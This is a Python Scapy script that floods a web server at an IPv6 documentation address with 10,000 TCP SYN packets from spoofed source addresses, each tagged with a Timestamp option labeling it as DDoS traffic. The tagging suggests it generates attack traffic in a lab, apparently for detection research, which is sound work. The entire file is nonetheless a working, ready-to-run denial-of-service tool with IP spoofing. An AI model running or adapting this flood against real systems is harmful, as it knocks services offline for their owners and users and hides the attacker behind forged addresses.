from random import randint, seed, choice
from scapy.all import sendp, get_if_hwaddr, conf
from scapy.layers.inet6 import Ether, IPv6, TCP

# Script parameters
ATTACK_PACKET_COUNT = 10000  # Number of packets to send
INTERFACE = "eth0"
SRC_MAC_ADDRESS = get_if_hwaddr(INTERFACE)
DST_MAC_ADDRESS = "02:01:01:01:00:01"
DST_IP = "2001:db8:1::1"
DST_PORT = 80
HOST_COUNT_PER_NETWORK = 20
seed(100)

# Define networks for spoofed IPs
SRC_NETWORKS = (
    "2001:db8:2::",
    "2001:db9:1::",
    "2001:dba:0:100::",
    "2001:dbb:0:100::",
    "2001:dbc:0:1::",
)

# Define the label for DDoS packets (Timestamp option)
DDOS_LABEL = 4000  # Unique ID for DDoS traffic

# Set Scapy interface
conf.iface = INTERFACE

def generate_src_ipv6_addresses(host_count_per_network: int, src_networks: tuple):
    """Generate a list of spoofed IPv6 addresses."""
    return [
        f"{network}{i:02x}" for network in src_networks for i in range(1, host_count_per_network + 1)
    ]

def generate_syn_packets():
    """Generate a batch of SYN packets with random spoofed source IPs and labeled options."""
    ips_to_spoof = generate_src_ipv6_addresses(HOST_COUNT_PER_NETWORK, SRC_NETWORKS)

    packets = [
        Ether(src=SRC_MAC_ADDRESS, dst=DST_MAC_ADDRESS) /
        IPv6(src=choice(ips_to_spoof), dst=DST_IP) /
        TCP(dport=DST_PORT, flags="S", options=[("Timestamp", (DDOS_LABEL, 0))])  # External DDoS
        for i in range(ATTACK_PACKET_COUNT)
    ]

    return packets

if __name__ == "__main__":
    print("Generating labeled DDoS SYN flood packets...")

    # Generate all packets in memory
    packets = generate_syn_packets()

    print(f"Sending {len(packets)} labeled DDoS packets all at once...")

    # Send all packets at once
    sendp(packets, iface=INTERFACE, verbose=False, inter=0)

    print("Packet sending complete.")
